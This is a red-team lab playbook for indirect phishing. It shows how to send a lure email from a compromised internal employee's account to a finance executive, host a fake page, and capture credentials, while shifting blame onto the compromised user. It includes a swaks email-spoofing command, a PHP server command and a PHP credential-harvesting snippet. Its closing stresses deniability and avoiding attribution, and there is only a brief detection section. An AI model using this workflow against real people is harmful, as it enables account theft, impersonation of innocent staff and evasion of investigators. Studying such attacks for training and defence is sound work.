## **Law 26 — Keep Your Hands Clean**

Interpretation (offensive context):  
Minimize direct attribution by **using intermediaries and trusted channels**. The attacker should not appear as the origin of the action—**others carry the interaction**.

---

# 🎯 Attack Scenario — _Indirect Phishing via Compromised Internal Account (Attribution Masking)_

You avoid direct contact with the target. Instead, you **operate through a previously compromised internal user**, making the attack appear legitimate.

**Target:**

> _James Fletcher_ — Finance Executive

**Compromised Identity (intermediary):**

> _Olivia Carter_, 20 y/o HR Assistant

---

# 🔴 Red Team Objective

- Achieve:
    
    - credential capture without direct attacker exposure
        
- Avoid:
    
    - attribution to attacker-controlled identity
        
- Use:
    
    - **trusted internal relay**
        

---

# 🖥️ Lab Setup

### VMs:

- **Kali (Attacker)** — 3GB
    
- **Ubuntu Victim 1 (Compromised user)** — 2GB
    
- **Ubuntu Victim 2 (Target)** — 2GB
    

### Network:

- Host-only
    

---

# ⚙️ Operator Workflow

## Phase 1 — Initial Compromise (Precondition)

Assume:

- You already have access to:
    
    ```
    olivia.carter@corp.local
    ```
    

👉 This becomes your **attack proxy**

---

## Phase 2 — Indirect Delivery

Instead of sending from attacker identity:

```bash
swaks --to james@corp.local \
--from olivia.carter@corp.local \
--server 192.168.56.101 \
--data "Subject: Document review

Hi James,

Could you quickly review this document?

http://192.168.56.101:8080

Thanks,
Olivia"
```

👉 Appears:

- internal
    
- trusted
    
- unrelated to attacker
    

---

## Phase 3 — Payload

```bash
php -S 0.0.0.0:8080
```

---

## Phase 4 — Execution

Target:

- recognizes sender
    
- trusts communication
    
- interacts with payload
    

👉 No suspicion of external attacker

---

## Phase 5 — Attribution Shield

Even if investigated:

- logs show:
    
    - Olivia’s account
        
- attacker identity remains hidden
    

👉 You are **not in the attack chain**

---

# 🛠️ Tooling + Commands

### Email relay via compromised account:

```bash
swaks --to james@corp.local --from olivia.carter@corp.local
```

---

### Hosting:

```bash
php -S 0.0.0.0:8080
```

---

### Credential capture:

```php
<?php
file_put_contents("creds.txt", $_POST['user']." ".$_POST['pass']."\n", FILE_APPEND);
?>
```

---

### Optional logging:

```php
<?php
file_put_contents("log.txt", $_SERVER['REMOTE_ADDR']."\n", FILE_APPEND);
?>
```

---

# 🧠 Social Engineering Mapping (Hadnagy)

Relevant concepts:

- **Trust transference** (from known user)
    
- **Indirect manipulation**
    
- **Social proof via internal identity**
    

Key principle:

> The most effective attacker is the one who is not seen

---

# 🛡️ Detection & Defensive Insight

Indicators:

- legitimate accounts sending:
    
    - unusual links
        
    - out-of-character messages
        
- behavioral anomalies:
    
    - timing, tone
        

Mitigation:

- monitor:
    
    - account behavior deviations
        
- enforce:
    
    - MFA for email accounts
        
- implement:
    
    - anomaly detection on internal communications
        

---

# 📄 Report Artifact

### Title:

> Indirect Social Engineering via Compromised Internal Identity

### Include:

- attack chain:
    
    - compromise → relay → target
        
- email sample
    
- credential capture
    
- analysis:
    
    - why trust transfer worked
        
- impact:
    
    - stealth compromise with attribution masking
        

---

# ⚠️ Operator Insight

Direct attacks:

- traceable
    

Indirect attacks:

- deniable
    
- harder to detect
    

You are not the attacker  
You are **the one behind the attacker**

---

